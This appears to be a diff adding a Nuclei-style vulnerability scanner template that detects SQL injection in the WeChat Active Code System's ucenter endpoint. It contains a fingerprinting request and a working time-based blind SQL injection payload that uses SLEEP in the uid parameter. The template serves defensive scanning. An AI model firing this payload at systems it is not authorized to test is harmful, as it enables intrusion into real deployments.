@@ -1,0 +1,47 @@
+id: wechat-active-code-system-ucenter-sqli
+info:
+  name: WeChat Active Code System ucenter SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a SQL injection vulnerability in the WeChat Active Code System ucenter endpoint.
+
+variables:
+  t1: '{{rand_int(2,5)}}'
+  t2: '{{to_number(t1) + to_number(t1)}}'
+  t3: '{{to_number(t2) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /ucenter/index/?uid=1) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "无此会员"
+          - "活码系统"
+
+  - raw:
+      - |
+        GET /ucenter/index/?uid=1)%20AND%20(SELECT%203460%20FROM%20(SELECT(SLEEP({{t1}})))RkHL)%20AND%20(1015=1015 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "活码系统"
+      - type: dsl
+        dsl:
+          - duration > to_number(t2)
+          - duration < to_number(t3)
